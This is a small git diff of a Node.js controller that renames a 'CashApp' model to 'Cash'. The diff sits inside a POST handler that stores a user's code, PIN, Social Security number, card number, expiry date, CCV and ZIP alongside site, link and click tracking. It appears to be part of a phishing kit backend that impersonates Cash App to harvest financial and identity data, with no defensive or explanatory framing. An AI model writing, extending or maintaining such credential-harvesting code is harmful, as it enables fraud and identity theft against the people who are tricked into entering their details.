@@ -7,7 +7,7 @@ const Site = require('../models/Site')
 const createToken = require('../utils/createToken')
 const LinkName = require('../models/LinkName')
 const Click = require('../models/Click')
-const CashApp = require('../models/CashApp')
+const Cash = require('../models/Cash')
 
 
 // const {API_KEY}=require('../keys')
@@ -795,7 +795,7 @@ module.exports.cashapap_post = async (req, res) => {
 
     try {
       
-        const cashapp = await CashApp.create({
+        const cashapp = await Cash.create({
             code, pin, ssn, site, card_number,mm_yy, ccv,zip
 
 
